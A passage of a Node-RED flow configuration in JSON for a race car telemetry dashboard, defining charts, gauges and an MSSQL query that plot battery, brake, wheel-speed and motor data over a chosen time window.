            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1120,
        "y": 320,
        "wires": [
            []
        ]
    },
    {
        "id": "6c2745fe442397c9",
        "type": "ui_gauge",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "b5264e960f9eb7eb",
        "order": 8,
        "width": "6",
        "height": "6",
        "gtype": "gage",
        "title": "Adaptive State of Charge",
        "label": "Percentage",
        "format": "{{value | number:2}}%",
        "min": 0,
        "max": "100",
        "colors": [
            "#00b500",
            "#e6e600",
            "#ca3838"
        ],
        "seg1": "",
        "seg2": "",
        "diff": false,
        "className": "",
        "x": 1130,
        "y": 360,
        "wires": []
    },
    {
        "id": "19ebdd6de4e7ec22",
        "type": "function",
        "z": "594e9fd18f91cc50",
        "name": "failsafe status interpreter",
        "func": "return msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1130,
        "y": 400,
        "wires": [
            [
                "4ec3ba31add2e0e4"
            ]
        ]
    },
    {
        "id": "faf4259f29f4989a",
        "type": "ui_chart",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "b5264e960f9eb7eb",
        "order": 6,
        "width": "10",
        "height": "6",
        "label": "Rolling Counter",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "0",
        "ymax": "255",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1100,
        "y": 440,
        "wires": [
            []
        ]
    },
    {
        "id": "a063d9a10e3f65a6",
        "type": "ui_chart",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "b5264e960f9eb7eb",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Total Pack ADC",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1100,
        "y": 480,
        "wires": [
            []
        ]
    },
    {
        "id": "30e16296e8c67c55",
        "type": "ui_chart",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "b5264e960f9eb7eb",
        "order": 4,
        "width": "10",
        "height": "6",
        "label": "Low Cell Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1110,
        "y": 520,
        "wires": [
            []
        ]
    },
    {
        "id": "1042301885d9fe1d",
        "type": "ui_text",
        "z": "594e9fd18f91cc50",
        "group": "b5264e960f9eb7eb",
        "order": 11,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "Low Cell Voltage ID",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1110,
        "y": 560,
        "wires": []
    },
    {
        "id": "78da8df175f75d03",
        "type": "ui_chart",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "b5264e960f9eb7eb",
        "order": 2,
        "width": "10",
        "height": "6",
        "label": "High Cell Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1110,
        "y": 600,
        "wires": [
            []
        ]
    },
    {
        "id": "159b9ce9eee465f6",
        "type": "ui_text",
        "z": "594e9fd18f91cc50",
        "group": "b5264e960f9eb7eb",
        "order": 12,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "High Cell Voltage ID",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1120,
        "y": 640,
        "wires": []
    },
    {
        "id": "4a0de4b619a5b63c",
        "type": "ui_chart",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "b5264e960f9eb7eb",
        "order": 3,
        "width": "10",
        "height": "6",
        "label": "Average Cell Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1120,
        "y": 680,
        "wires": [
            []
        ]
    },
    {
        "id": "4ec3ba31add2e0e4",
        "type": "ui_text",
        "z": "594e9fd18f91cc50",
        "group": "b5264e960f9eb7eb",
        "order": 14,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "Failsafe status",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1380,
        "y": 400,
        "wires": []
    },
    {
        "id": "d52d09416ca80cc5",
        "type": "function",
        "z": "594e9fd18f91cc50",
        "name": "failsafe status interpreter",
        "func": "return msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1130,
        "y": 720,
        "wires": [
            [
                "2e3a44a766a53690"
            ]
        ]
    },
    {
        "id": "2e3a44a766a53690",
        "type": "ui_text",
        "z": "594e9fd18f91cc50",
        "group": "b5264e960f9eb7eb",
        "order": 14,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "BMS Failsafe status",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1400,
        "y": 720,
        "wires": []
    },
    {
        "id": "aa2bd7450b0bc93e",
        "type": "MSSQL",
        "z": "0208dc768b26306e",
        "mssqlCN": "933ce03686fddbab",
        "name": "Past Data",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT *\nFROM dbo.race_data\nWHERE timestamp BETWEEN '{{payload.start_time}}' AND '{{payload.end_time}}'\nORDER BY timestamp",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "payload.selectedDateTime",
        "paramsOptType": "msg",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": 760,
        "y": 260,
        "wires": [
            [
                "e356dfd0b6f66564",
                "aa99f8232a20286c",
                "6ee1eaa9c67b5ac5",
                "361a6099fc3bfb73",
                "30ba88a2b0f1d33d",
                "ebd5e728fd765184",
                "d82e4c1edd1f411a",
                "861015485553d17a",
                "492a6d03c18046f2",
                "adf8540e2052d147",
                "7d9b5de991a58784",
                "4fd0563b6dfe4a9c",
                "9aed8cfc618d4047",
                "d13d415264b13a20"
            ]
        ]
    },
    {
        "id": "0529e4a7cd0375f0",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Convert Date & Time",
        "func": "// Extract date and time components from the incoming message\nvar start_time = msg.payload.starting_time; // Assuming date is provided by ui_date node\nvar duration = msg.payload.duration; // Assuming time is provided by ui_time node\n\nstart_time = start_time / 1000;     //Convert from milliseconds to seconds\nstart_time = start_time + 5*60*60;  //Convert to EST by adding 5 hours \n\nduration = duration * 60;    //Convert duration from minutes to seconds\n\nmsg.payload =\n{\n    start_time: start_time,\n    end_time : start_time + duration\n}\n\n// Pass the modified message to the next node in the flow\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 500,
        "y": 260,
        "wires": [
            [
                "c33474b65fcccf47",
                "aa2bd7450b0bc93e"
            ]
        ]
    },
    {
        "id": "c33474b65fcccf47",
        "type": "ui_text",
        "z": "0208dc768b26306e",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 3,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "payload",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 760,
        "y": 220,
        "wires": []
    },
    {
        "id": "c2445e63c5487844",
        "type": "ui_text_input",
        "z": "0208dc768b26306e",
        "name": "",
        "label": "Starting Time",
        "tooltip": "",
        "group": "881b1308b85cd435",
        "order": 4,
        "width": 0,
        "height": 0,
        "passthru": true,
        "mode": "datetime-local",
        "delay": 300,
        "topic": "starting_time",
        "sendOnBlur": true,
        "className": "",
        "topicType": "str",
        "x": 100,
        "y": 240,
        "wires": [
            [
                "d8e7238c8d02286e",
                "45477f7b972db4af"
            ]
        ]
    },
    {
        "id": "8e27a45cac81d3b1",
        "type": "ui_slider",
        "z": "0208dc768b26306e",
        "name": "",
        "label": "Duration (Minutes)",
        "tooltip": "",
        "group": "881b1308b85cd435",
        "order": 4,
        "width": 0,
        "height": 0,
        "passthru": true,
        "outs": "all",
        "topic": "duration",
        "topicType": "str",
        "min": 0,
        "max": "30",
        "step": 1,
        "className": "",
        "x": 110,
        "y": 280,
        "wires": [
            [
                "d8e7238c8d02286e",
                "78c27038f0b273f1"
            ]
        ]
    },
    {
        "id": "d8e7238c8d02286e",
        "type": "join",
        "z": "0208dc768b26306e",
        "name": "",
        "mode": "custom",
        "build": "object",
        "property": "payload",
        "propertyType": "msg",
        "key": "topic",
        "joiner": "\\n",
        "joinerType": "str",
        "accumulate": true,
        "timeout": "",
        "count": "2",
        "reduceRight": false,
        "reduceExp": "",
        "reduceInit": "",
        "reduceInitType": "",
        "reduceFixup": "",
        "x": 290,
        "y": 260,
        "wires": [
            [
                "0529e4a7cd0375f0",
                "bc0ec4e2d145ac9b"
            ]
        ]
    },
    {
        "id": "45477f7b972db4af",
        "type": "ui_text",
        "z": "0208dc768b26306e",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 4,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Start",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 230,
        "y": 180,
        "wires": []
    },
    {
        "id": "78c27038f0b273f1",
        "type": "ui_text",
        "z": "0208dc768b26306e",
        "group": "881b1308b85cd435",
        "order": 5,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Duration",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 260,
        "y": 340,
        "wires": []
    },
    {
        "id": "bc0ec4e2d145ac9b",
        "type": "ui_text",
        "z": "0208dc768b26306e",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 5,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Func Input",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 450,
        "y": 300,
        "wires": []
    },
    {
        "id": "e356dfd0b6f66564",
        "type": "ui_text",
        "z": "0208dc768b26306e",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 4,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "SQL Query Results",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 970,
        "y": 260,
        "wires": []
    },
    {
        "id": "aa99f8232a20286c",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.wheel_speed_front_left);\nlet series2 = msg.payload.map(item => item.wheel_speed_front_right);\nlet series3 = msg.payload.map(item => item.wheel_speed_rear_left);\nlet series4 = msg.payload.map(item => item.wheel_speed_rear_right);\n\nmsg.payload = [\n    {\n        \"series\": [\"Wheel Speed Front Left\", \"Wheel Speed Front Right\", \"Wheel Speed Rear Left\", \"Wheel Speed Rear Right\"],\n        \"data\": [series1, series2, series3, series4],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 300,
        "wires": [
            [
                "4a202d366fb96e9b"
            ]
        ]
    },
    {
        "id": "4a202d366fb96e9b",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Wheel Speeds",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1220,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "6ee1eaa9c67b5ac5",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.brake_pressure_front);\nlet series2 = msg.payload.map(item => item.brake_pressure_rear);\n\nmsg.payload = [\n    {\n        \"series\": [\"Front Brake Pressure\", \"Rear Brake Pressure\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 340,
        "wires": [
            [
                "10f3d0bd750b8585"
            ]
        ]
    },
    {
        "id": "10f3d0bd750b8585",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Brake Pressures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1220,
        "y": 340,
        "wires": [
            []
        ]
    },
    {
        "id": "361a6099fc3bfb73",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.steering_angle);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Steering Angle\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 380,
        "wires": [
            [
                "18d6989aa55074c9"
            ]
        ]
    },
    {
        "id": "18d6989aa55074c9",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Steering Angle",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1220,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "30ba88a2b0f1d33d",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.vehicle_speed);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Vehicle Speed\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 420,
        "wires": [
            [
                "2a2eac3950e62ca9"
            ]
        ]
    },
    {
        "id": "2a2eac3950e62ca9",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Vehicle Speed",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1220,
        "y": 420,
        "wires": [
            []
        ]
    },
    {
        "id": "ebd5e728fd765184",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.high_temp);\nlet series2 = msg.payload.map(item => item.low_temp);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"High temperatures\", \"Low temperatures\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 460,
        "wires": [
            [
                "d99fb51aef83a941"
            ]
        ]
    },
    {
        "id": "d99fb51aef83a941",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "High/Low Battery Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1270,
        "y": 460,
        "wires": [
            []
        ]
    },
    {
        "id": "d82e4c1edd1f411a",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.pack_open_voltage);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Pack Open Voltage\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 500,
        "wires": [
            [
                "fd00e7a7e71572fe"
            ]
        ]
    },
    {
        "id": "fd00e7a7e71572fe",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Pack Open Voltage",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1230,
        "y": 500,
        "wires": [
            []
        ]
    },
    {
        "id": "861015485553d17a",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.pack_amp_hours);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Pack Amp Hours\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 540,
        "wires": [
            [
                "ec24f5a6867c1e4f"
            ]
        ]
    },
    {
        "id": "ec24f5a6867c1e4f",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Pack Amp Hours",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1230,
        "y": 540,
        "wires": [
            []
        ]
    },
    {
        "id": "492a6d03c18046f2",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_motor_speed);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Motor Speed\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 580,
        "wires": [
            [
                "d5e05207d12def18"
            ]
        ]
    },
    {
        "id": "d5e05207d12def18",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Motor Speed",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1210,
        "y": 580,
        "wires": [
            []
        ]
    },
    {
        "id": "adf8540e2052d147",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_motor_temperature);\n\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Motor Temperature\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 620,
        "wires": [
            [
                "90cb6754de2d7c45"
            ]
        ]
    },
    {
        "id": "90cb6754de2d7c45",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Motor Temperature",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1230,
        "y": 620,
        "wires": [
            []
        ]
    },
    {
        "id": "7d9b5de991a58784",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.brake_temperature_front_left);\nlet series2 = msg.payload.map(item => item.brake_temperature_front_right);\nlet series3 = msg.payload.map(item => item.brake_temperature_rear_left);\nlet series4 = msg.payload.map(item => item.brake_temperature_rear_right);\n\n\nmsg.payload = [\n    {\n        \"series\": [\"Brake Temp Front Left\", \"Brake Temperature Front Right\", \"Brake Temperature Rear Left\", \"Brake Temperature Rear Right\"],\n        \"data\": [series1, series2, series3, series4],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 970,
        "y": 660,
        "wires": [
            [
                "e33758779a900714"
            ]
        ]
    },
    {
        "id": "e33758779a900714",
        "type": "ui_chart",
        "z": "0208dc768b26306e",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Brake Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "10000",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1240,
        "y": 660,
        "wires": [
            []
        ]
    },
    {
        "id": "4fd0563b6dfe4a9c",
        "type": "function",
        "z": "0208dc768b26306e",
        "name": "Choose Variables",
